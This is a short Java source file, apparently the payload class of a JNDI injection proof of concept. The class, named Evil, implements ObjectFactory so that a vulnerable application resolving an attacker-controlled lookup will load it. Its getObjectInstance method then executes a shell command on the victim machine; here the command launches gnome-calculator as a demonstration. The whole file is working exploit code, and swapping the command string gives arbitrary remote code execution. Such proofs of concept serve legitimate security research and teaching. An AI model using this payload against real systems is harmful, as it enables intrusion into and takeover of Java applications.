package jndiserver;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class Evil implements ObjectFactory {

    {
        System.err.println("Evil message.");
    }

    @Override
    public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {
        String command = "gnome-calculator" ;
        Runtime.getRuntime().exec(command);
        return  null ;
    }
}